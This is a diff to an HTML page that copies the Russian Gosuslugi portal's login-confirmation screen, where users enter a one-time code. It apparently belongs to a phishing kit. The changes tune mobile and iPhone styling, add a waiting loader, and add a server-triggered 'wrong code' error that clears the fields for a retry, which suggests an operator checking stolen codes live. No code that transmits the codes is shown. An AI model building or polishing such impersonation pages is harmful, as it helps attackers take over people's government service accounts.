@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="theme-color" content="#0d4cd3">
     <title>Госуслуги — Подтверждение входа</title>
@@ -21,15 +21,17 @@
             flex-direction: column;
             align-items: center;
             justify-content: flex-start;
+            -webkit-text-size-adjust: 100%;
+            -webkit-tap-highlight-color: transparent;
         }
         .main-block {
             background: #fff;
             border-radius: 18px;
             box-shadow: 0 4px 24px #b3c6e6aa;
-            max-width: 400px;
+            max-width: 382px;
             width: 100%;
-            margin-top: 40px;
-            padding: 56px 32px 32px 32px;
+            margin: 46px 0 0 0;
+            padding: 56px 32px 48px 32px;
             box-sizing: border-box;
             display: flex;
             flex-direction: column;
@@ -63,9 +65,10 @@
         }
         .logo {
             display: block;
-            margin: 0 auto 48px auto;
+            margin: 0 auto 43px auto;
             width: 194px;
             height: 34px;
+            line-height: 1;
         }
         .title {
             font-size: 24px;
@@ -101,27 +104,34 @@
             display: none;
             text-align: left;
             margin: 4px 0 0 0;
-            display: block;
+        }
+        .error-message-server {
+            color: #ef5350;
+            font-size: 15px;
+            margin-top: 4px;
+            text-align: left;
+            display: none;
         }
         .code-inputs {
+            width: 100%;
             display: flex;
             gap: 10px;
-            margin-bottom: 32px;
             justify-content: center;
-            width: 100%;
+            margin-bottom: 18px;
         }
         .code-inputs input {
-            width: 40px;
+            width: 44px;
             height: 48px;
-            border: 1.5px solid #e3e7ee;
             border-radius: 8px;
+            border: none;
+            background: #f5f7fa;
+            font-size: 18px;
+            font-weight: normal;
             text-align: center;
-            font-size: 16px;
-            font-weight: 400;
-            color: #0b1f33;
-            background: #f3f6fb;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            box-shadow: none;
+            outline: none;
+            transition: background 0.2s, border 0.2s;
+            color: #222;
+            box-sizing: border-box;
         }
         .code-inputs input:focus {
             border-color: #0d4cd3;
@@ -129,7 +139,16 @@
             box-shadow: 0 0 0 2px #e3e7ee;
         }
         .code-inputs.error input {
-            border-color: #ef5350;
+            background-color: #fff0f0 !important;
+            border: none !important;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+        .code-inputs.error input:focus {
+            border: none !important;
+            background-color: #fff0f0 !important;
+            -webkit-appearance: none;
+            appearance: none;
         }
         .timer-block {
             width: 100%;
@@ -161,7 +180,8 @@
             color: #0d4cd3;
             font-size: 15px;
             text-align: center;
-            margin-top: 18px;
+            margin-top: 24px;
+            margin-bottom: 0;
             background: none;
             border: none;
             cursor: pointer;
@@ -240,34 +260,71 @@
         .loader-overlay {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(255,255,255,0.7);
+            background: transparent;
             display: none;
             align-items: center;
             justify-content: center;
             z-index: 1000;
             backdrop-filter: blur(4px);
         }
+        .loader {
+            border: 6px solid #e4ecfd;
+            border-top: 6px solid #0d4cd3;
+            border-radius: 50%;
+            width: 48px;
+            height: 48px;
+            animation: spin 1s linear infinite;
+            margin: auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
         @media (max-width: 500px) {
             .main-block {
-                max-width: 98vw;
-                padding: 20px 6vw 20px 6vw;
+                max-width: 382px;
+                padding: 45px 16px 32px 16px;
+                box-sizing: border-box;
+                margin: 46px 0 0 0;
             }
             .logo {
                 height: 32px;
-                margin-bottom: 20px;
+                margin-bottom: 43px;
             }
             .title {
                 font-size: 20px;
-                margin-bottom: 24px;
+                margin-bottom: 16px;
             }
             .info-text {
                 font-size: 15px;
-                margin-bottom: 32px;
+                margin-bottom: 24px;
             }
-            .code-inputs input {
-                width: 32px;
-                height: 40px;
-                font-size: 14px;
+            .code-inputs {
+                gap: 8px;
+            }
+        }
+        @media (max-width: 400px) {
+            .main-block {
+                max-width: 90vw;
+                margin: 46px auto 0 auto;
+                padding: 45px 4vw 32px 4vw;
+                box-sizing: border-box;
+            }
+            .code-inputs {
+                gap: 6px;
+            }
+        }
+        /* Специальные стили для iPhone */
+        @supports (-webkit-touch-callout: none) {
+            .main-block {
+                margin-top: 40px !important;
+                padding-top: 40px !important;
+            }
+            @media (max-width: 500px) {
+                .main-block {
+                    margin-top: 40px !important;
+                    padding-top: 40px !important;
+                }
             }
         }
     </style>
@@ -285,6 +342,7 @@
         <div class="code-label-row">
             <span class="code-label">Код подтверждения</span>
             <div class="code-error-message" id="code-error-message">Неверный код</div>
+            <span class="error-message-server" id="error-message-server" style="display:none;">Неверный код</span>
         </div>
         <form id="code-form" autocomplete="off" style="width:100%;display:flex;flex-direction:column;align-items:center;">
             <div class="code-inputs">
@@ -304,7 +362,10 @@
     </div>
     <!-- Новый видео-лоадер поверх всего -->
     <div class="loader-overlay" id="loader-overlay">
-      <video src="6533f10d.webm" autoplay loop muted playsinline style="width:340px;height:340px;object-fit:contain;background:transparent;pointer-events:none;"></video>
+      <video id="loader-video" src="6533f10d.webm" autoplay loop muted playsinline style="width:340px;height:340px;object-fit:contain;background:transparent;pointer-events:none;display:block;"></video>
+      <div id="loader-fallback" style="display:none;align-items:center;justify-content:center;width:100%;height:100%;">
+        <div class="loader"></div>
+      </div>
     </div>
 
     <!-- Модальное окно для справки по подтверждению входа -->
@@ -393,7 +454,10 @@
             });
             input.addEventListener('focus', function() {
                 this.select();
-                document.getElementById('code-error-message').style.display = 'none';
+                const errorMsg = document.getElementById('code-error-message');
+                const serverError = document.getElementById('error-message-server');
+                if (errorMsg) errorMsg.style.display = 'none';
+                if (serverError) serverError.style.display = 'none';
                 document.querySelector('.code-inputs').classList.remove('error');
             });
             // Вставка по ctrl+V
@@ -588,13 +652,22 @@
 
         // Показать ошибку
         function showError() {
-            codeInputs.forEach(inp => {
-                inp.disabled = false;
-                inp.value = '';
-            });
-            document.querySelector('.code-inputs').classList.add('error');
-            document.getElementById('code-error-message').style.display = 'block';
-            codeInputs[0].focus();
+            console.log('showError called');
+            hideWaitLoader();
+            setTimeout(() => {
+                // Показываем только серверную ошибку
+                const serverError = document.getElementById('error-message-server');
+                if (serverError) serverError.style.display = 'block';
+                // Скрываем обычную ошибку
+                const errorMsg = document.getElementById('code-error-message');
+                if (errorMsg) errorMsg.style.display = 'none';
+                document.querySelector('.code-inputs').classList.add('error');
+                // Делаем поля снова активными!
+                codeInputs.forEach(inp => { inp.disabled = false; });
+                // Очищаем input-ы
+                codeInputs.forEach(inp => { inp.value = ''; });
+                // Не делаем автофокус!
+            }, 100);
         }
 
         // Логика для кнопки "Не могу подтвердить" (открытие модального окна справки)
@@ -624,6 +697,19 @@
             }
             codeInputs[0].focus();
         });
+
+        const loaderVideo = document.getElementById('loader-video');
+        const loaderFallback = document.getElementById('loader-fallback');
+        if (loaderVideo && loaderFallback) {
+            loaderVideo.onerror = function() {
+                loaderVideo.style.display = 'none';
+                loaderFallback.style.display = 'flex';
+            };
+            if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                loaderVideo.style.display = 'none';
+                loaderFallback.style.display = 'flex';
+            }
+        }
     </script>
 </body>
 </html> 
